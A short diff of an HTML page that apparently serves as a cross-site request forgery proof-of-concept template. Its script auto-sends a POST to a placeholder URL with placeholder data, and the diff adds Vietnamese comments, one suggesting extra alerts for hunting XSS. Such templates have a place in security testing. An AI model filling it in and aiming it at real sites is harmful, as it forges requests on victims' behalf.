@@ -1,16 +1,16 @@
 <html>
 <script>
 var http = new XMLHttpRequest();
-var url = 'Chen URL'
-var params = ' POST Data'
+var url = 'Chèn URL'
+var params = ' Chèn POST DATA'
 http.open('POST',url,true);
 
 http.setRequestHeader('Content-type','application/x-www-form-urlencoded');
-http.onreadystatechange = function()
+http.onreadystatechange = function()   //Gọi hàm khi trạng thái thay đổi
 
 {
 	if(http.readyState==4 && http.status == 200){
-		alert(http.responseText);
+		alert(http.responseText); // Có thể thêm vài cái Alert cho kiếm thêm cái XSS cho nó phiêu đờ bít
 	}
 }
 http.send(params);
